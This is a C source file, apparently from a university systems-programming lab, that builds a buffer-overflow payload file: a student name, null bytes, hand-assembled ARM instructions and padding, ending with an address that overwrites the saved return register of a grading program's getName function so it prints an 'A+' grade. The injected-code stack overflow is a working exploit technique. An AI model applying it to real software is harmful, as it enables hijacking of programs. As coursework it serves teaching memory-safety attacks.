/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Ariel Yuan, Grace Best.                                    */
/* Purpose: "Produces a file called dataA with the student name, a    */
/* nullbyte, the address of the malicious instruction in an array     */
/* element of name[] to get an A, which will overwrite getName's      */
/* stored x30 and padding to overrun the stack.                       */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "miniassembler.h"

/* This is supposed to be the comment before main? Returns 0.  */

FILE *psFILE;
int main(void)
{
    int i;
    
    unsigned int ulData;  /* Address of A instruction */
    unsigned long addr = 0x420060;  /* Address of A instruction */

    psFILE = fopen("dataAplus", "w");
    fprintf(psFILE, "Grace");   /* Write our names to file */
    fprintf(psFILE, "%c", '\0');     /* Write null byte after name */
    for (i = 0; i < 2; i++)
    {
        fprintf(psFILE, "%c", '\0');
    }
    /* mov x1, '+' */
    ulData = MiniAssembler_mov(1, '+');
    fwrite(&ulData, sizeof(unsigned int), 1, psFILE);

    /* adr x0, string */
    ulData = MiniAssembler_adr(0, 0x400920, addr + 4);
    /* Overwrite getName's stored x30 w/ instruction to get a A */
    fwrite(&ulData, sizeof(unsigned int), 1, psFILE);
    
    /*bl 0x400690 <printf@plt>*/
    ulData = MiniAssembler_bl(0x400690, addr + 8);
    fwrite(&ulData, sizeof(unsigned int), 1, psFILE);

    /* b 0x4008b0 */
    ulData = MiniAssembler_b(0x4008b0, addr + 12);
    fwrite(&ulData, sizeof(unsigned int), 1, psFILE);

    /* Write padding of 18(?) characters to overrun stack */
    for (i = 0; i < 24; i++)
    {
        fprintf(psFILE, "%c", '\0');
    }
    fwrite(&addr, sizeof(unsigned long), 1, psFILE);


    fclose(psFILE);
    return 0;
}